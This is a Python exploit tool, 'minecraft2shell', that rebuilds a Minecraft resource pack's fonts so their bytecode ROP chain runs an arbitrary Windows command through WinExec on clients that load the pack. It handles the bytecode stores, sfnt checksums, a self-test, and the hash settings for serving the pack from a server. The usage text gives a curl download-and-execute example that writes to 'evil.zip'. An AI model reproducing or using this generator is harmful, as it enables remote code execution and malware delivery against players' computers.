#!/usr/bin/env python3
"""minecraft2shell payload generator.

Rebuilds a Minecraft resource pack so the font ROP chain executes an
arbitrary WinExec command line instead of the hardcoded "calc.exe".

Payload layout inside the font bytecode (fpgm), persistent storage cells:

    storage[14528..14534] = L"kernel32.dll"   (UTF-16LE, GetModuleHandleExW)
    storage[14544..14545] = "WinExec\\0"      (ANSI,  GetProcAddress)
    storage[14552..     ] = "<command line>"  (ANSI,  passed to WinExec)

Constants are stored with 19-byte blocks:

    PUSHW idx / PUSHW hi / PUSHW 16384 / MUL / PUSHW 16384 / MUL / PUSHW lo / ADD / WS

(two MULs by 16384 in 26.6 fixed point == `value << 16`).  The first command
cell must stay at 14552 because the ROP data bakes in a pointer to it; the
string may grow though - cells 14536..16369 are unused, the bootstrap writes
cells 16370+.

Usage:
    python gen_payload.py --cmd "start notepad"
    python gen_payload.py --cmd "curl -o %TEMP%\\x.exe http://h/x && %TEMP%\\x" -o evil.zip
    python gen_payload.py --cmd "calc.exe" --raw -o custom.zip --patch-poc
"""
import argparse
import hashlib
import re
import struct
import sys
import zipfile
from pathlib import Path

STORE_OFF = 0x095D       # first constant store inside fpgm
STORE_SIZE = 19          # bytes per store block
CMD_BASE = 14552         # first storage cell of the command line
KEEP_CELLS = [14544, 14545]      # L-name cells are earlier; these hold "WinE"/"xec\0"
OLD_CELLS = 3            # cells the original calc.exe string occupies
CHAIN = b'\xB8\x40\x00\x63'   # PUSHW 16384; MUL
MAX_CELLS = 16370 - CMD_BASE   # bootstrap cells begin at 16370


def signed16(v):
    v &= 0xFFFF
    return v - 0x10000 if v & 0x8000 else v


def make_store(idx, chunk):
    """Emit one 19-byte store: PUSHW idx / value / WS  (value = u32_le(chunk))."""
    val = int.from_bytes(chunk, 'little')
    return (b'\xB8' + struct.pack('>h', signed16(idx))
            + b'\xB8' + struct.pack('>h', signed16(val >> 16))
            + CHAIN + CHAIN
            + b'\xB8' + struct.pack('>h', signed16(val & 0xFFFF))
            + b'\x60\x42')                # ADD, WS


def split_cells(raw):
    """ANSI bytes -> list of 4-byte cells; a NUL terminator is appended."""
    data = raw + b'\0'
    if len(data) % 4:
        data += b'\0' * (4 - len(data) % 4)
    return [data[i:i + 4] for i in range(0, len(data), 4)]


def decode_stores(fpgm, count, base=STORE_OFF):
    """Decode `count` constant stores at `base` -> [(cell, u32)]."""
    out = []
    for k in range(count):
        o = base + STORE_SIZE * k
        f = fpgm
        if (f[o] != 0xB8 or f[o + 3] != 0xB8 or f[o + 6:o + 10] != CHAIN
                or f[o + 10:o + 14] != CHAIN or f[o + 17:o + 19] != b'\x60\x42'):
            raise ValueError('store block %d: unexpected bytecode' % k)
        idx = struct.unpack('>H', f[o + 1:o + 3])[0]
        hi = struct.unpack('>H', f[o + 4:o + 6])[0]
        lo = struct.unpack('>H', f[o + 15:o + 17])[0]
        out.append((idx, (hi << 16) | lo))
    return out


def rebuild_stores(fpgm, cmd_raw):
    """Swap the three calc.exe stores for stores of `cmd_raw` (+NUL)."""
    # sanity: the five original stores must sit where the exploit baked them
    orig = decode_stores(fpgm, 2 + OLD_CELLS)
    assert [c for c, _ in orig[:2]] == KEEP_CELLS, 'name cells not where expected'
    assert [c for c, _ in orig[2:]] == [CMD_BASE + k for k in range(OLD_CELLS)], \
        'command cells not at %d..' % CMD_BASE
    assert orig[2][1] == 0x636C6163 and orig[3][1] == 0x6578652E, 'not calc.exe'
    head = fpgm[:STORE_OFF]
    keep = fpgm[STORE_OFF:STORE_OFF + 2 * STORE_SIZE]   # kernel32/WinExec names
    tail = fpgm[STORE_OFF + (2 + OLD_CELLS) * STORE_SIZE:]
    cells = split_cells(cmd_raw)
    while len(cells) < OLD_CELLS:
        cells.append(b'\0\0\0\0')
    if len(cells) > MAX_CELLS:
        raise ValueError('command needs %d cells, storage allows %d'
                         % (len(cells), MAX_CELLS))
    body = b''.join(make_store(CMD_BASE + k, c) for k, c in enumerate(cells))
    return head + keep + body + tail


def sfnt_sum(blob):
    blob = blob + b'\0' * (-len(blob) % 4)
    total = 0
    for i in range(0, len(blob), 4):
        total = (total + int.from_bytes(blob[i:i + 4], 'big')) & 0xFFFFFFFF
    return total


def parse_sfnt(data):
    n = struct.unpack('>H', data[4:6])[0]
    tables = []
    for i in range(n):
        tag, _, off, ln = struct.unpack('>4sIII', data[12 + 16 * i:28 + 16 * i])
        tables.append((tag, bytes(data[off:off + ln])))
    return tables


def build_sfnt(tables):
    """Assemble [(tag, data)] into a full sfnt (sorted dir, real checksums)."""
    placed = sorted(tables, key=lambda t: t[0])
    n = len(placed)
    search = 16
    while search * 2 <= n * 16:
        search *= 2
    esel = search.bit_length() - 5
    header = struct.pack('>IHHHH', 0x00010000, n, search, esel, n * 16 - search)
    dir_size = 12 + 16 * n
    body = b''
    layout = []
    for tag, blob in placed:
        if tag == b'head':                    # checksum field must be 0
            blob = blob[:8] + b'\0\0\0\0' + blob[12:]
        layout.append((tag, dir_size + len(body), blob))
        body += blob + b'\0' * (-len(blob) % 4)
    directory = b''.join(struct.pack('>4sIII', tag, sfnt_sum(blob), off, len(blob))
                         for tag, off, blob in layout)
    out = bytearray(header + directory + body)
    whole = 0
    for i in range(0, len(out), 4):
        whole = (whole + int.from_bytes(out[i:i + 4].ljust(4, b'\0'), 'big')) & 0xFFFFFFFF
    adjust = (0xB1B0AFBA - whole) & 0xFFFFFFFF
    for tag, off, blob in layout:
        if tag == b'head':
            struct.pack_into('>I', out, off + 8, adjust)
    return bytes(out)


def patch_font(ttf, cmd_raw):
    """Return the font with the command-line stores swapped for `cmd_raw`."""
    tables = parse_sfnt(ttf)
    blobs = dict(tables)
    new_fpgm = rebuild_stores(blobs[b'fpgm'], cmd_raw)
    if len(new_fpgm) > len(blobs[b'fpgm']):
        # keep maxp.maxSizeOfInstructions (offset 26, u16 BE) >= fpgm length
        # (defensive: FreeType enforces it for glyph programs only, but this
        # build mirrors the fpgm size in that field)
        maxp = bytearray(blobs[b'maxp'])
        struct.pack_into('>H', maxp, 26, len(new_fpgm))
        blobs[b'maxp'] = bytes(maxp)
    blobs[b'fpgm'] = new_fpgm
    return build_sfnt(list(blobs.items()))


def selftest(pack_path, cmd_raw):
    """Decode the OUTPUT pack: names intact, command bytes in place."""
    zf = zipfile.ZipFile(pack_path)
    names = [n for n in zf.namelist() if n.endswith('.ttf')]
    assert len(names) == 144, 'expected 144 fonts, found %d' % len(names)
    digests = set()
    ncells = (len(cmd_raw) + 1 + 3) // 4
    for name in names:
        tables = dict(parse_sfnt(zf.read(name)))
        fpgm = tables[b'fpgm']
        stores = decode_stores(fpgm, 2 + ncells)
        assert [c for c, _ in stores[:2]] == KEEP_CELLS, 'name cells moved'
        raw = b''.join(struct.pack('<I', v) for _, v in stores[2:])
        assert raw[:len(cmd_raw)] == cmd_raw, 'command bytes wrong'
        assert raw[len(cmd_raw)] == 0, 'missing terminator'
        assert set(raw[len(cmd_raw) + 1:]) <= {0}, 'stray bytes after command'
        digests.add(hashlib.sha1(fpgm).hexdigest())
    assert len(digests) == 1, 'fonts diverged'
    # maxp.maxSizeOfInstructions must cover the (possibly grown) fpgm
    ttf0 = dict(parse_sfnt(zf.read(names[0])))
    maxp = ttf0[b'maxp']
    assert struct.unpack('>H', maxp[26:28])[0] >= len(ttf0[b'fpgm']), \
        'maxp.maxSizeOfInstructions smaller than fpgm'
    return True


def ansi_bytes(text):
    """WinExec is ANSI: encode with the system code page (cp1251 on RU)."""
    if sys.platform == 'win32':
        import ctypes
        try:
            return text.encode('cp%d' % ctypes.windll.kernel32.GetACP())
        except UnicodeEncodeError:
            pass
    return text.encode('latin-1')


def parse_args(argv):
    ap = argparse.ArgumentParser(
        description='minecraft2shell payload generator: arbitrary WinExec command line')
    ap.add_argument('--cmd', default='calc.exe',
                    help='command to execute; prefixed with "cmd /c " unless it already starts with cmd (default: calc.exe)')
    ap.add_argument('--raw', action='store_true',
                    help='pass --cmd to WinExec verbatim (no cmd /c wrapping)')
    ap.add_argument('--src', default='resource-pack.zip',
                    help='source pack (default: resource-pack.zip)')
    ap.add_argument('-o', '--out', default=None,
                    help='output pack (default: <src>-cmd.zip)')
    ap.add_argument('--patch-poc', action='store_true',
                    help='point poc.py (PACK / PACK_SHA1) at the generated pack')
    return ap.parse_args(argv)


def main(argv=None):
    opts = parse_args(argv)
    text = opts.cmd
    if not opts.raw and not text.lower().startswith(('cmd', '"cmd')):
        text = 'cmd /c ' + text
    try:
        raw = ansi_bytes(text)
    except UnicodeEncodeError as e:
        raise SystemExit('command not encodable in the ANSI code page: %s' % e)
    if len(raw) > 4000:
        raise SystemExit('command too long after ANSI encoding (%d bytes, max 4000)' % len(raw))

    src = Path(opts.src)
    out = Path(opts.out) if opts.out else src.with_name(src.stem + '-cmd' + src.suffix)
    if out.resolve() == src.resolve():
        raise SystemExit('refusing to overwrite the source pack; pass -o')

    with zipfile.ZipFile(src) as zin, zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as zout:
        for info in zin.infolist():
            blob = zin.read(info.filename)
            if info.filename.lower().endswith('.ttf'):
                blob = patch_font(blob, raw)
            zout.writestr(info, blob)

    digest = hashlib.sha1(out.read_bytes()).hexdigest().upper()
    selftest(out, raw)
    print('command      : %s' % text)
    print('ansi bytes   : %r' % raw)
    print('pack written : %s (%d bytes)' % (out, out.stat().st_size))
    print('pack sha1    : %s' % digest)
    print('self-test    : OK (WinExec/kernel32 names intact, command verified)')
    print()
    print('server.properties:')
    print('    resource-pack-sha1=%s' % digest)
    print('poc.py:')
    print('    PACK_SHA1 = "%s"' % digest)
    print('    PACK = ROOT / "%s"' % out.name)
    if opts.patch_poc:
        poc = Path(__file__).resolve().parent / 'poc.py'
        text = poc.read_text(encoding='utf-8')
        # the runner prefers resource-pack-cmd.zip automatically; make the
        # default explicit so the generated pack is always the one served
        text = re.sub(r'DEFAULT_PACK = ROOT / "[^"]+"',
                      'DEFAULT_PACK = ROOT / "%s"' % out.name, text)
        poc.write_text(text, encoding='utf-8')
        print('poc.py patched: DEFAULT_PACK -> "%s"' % out.name)
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except Exception as error:
        print('GEN_FAILURE %s' % error, file=sys.stderr)
        sys.exit(1)
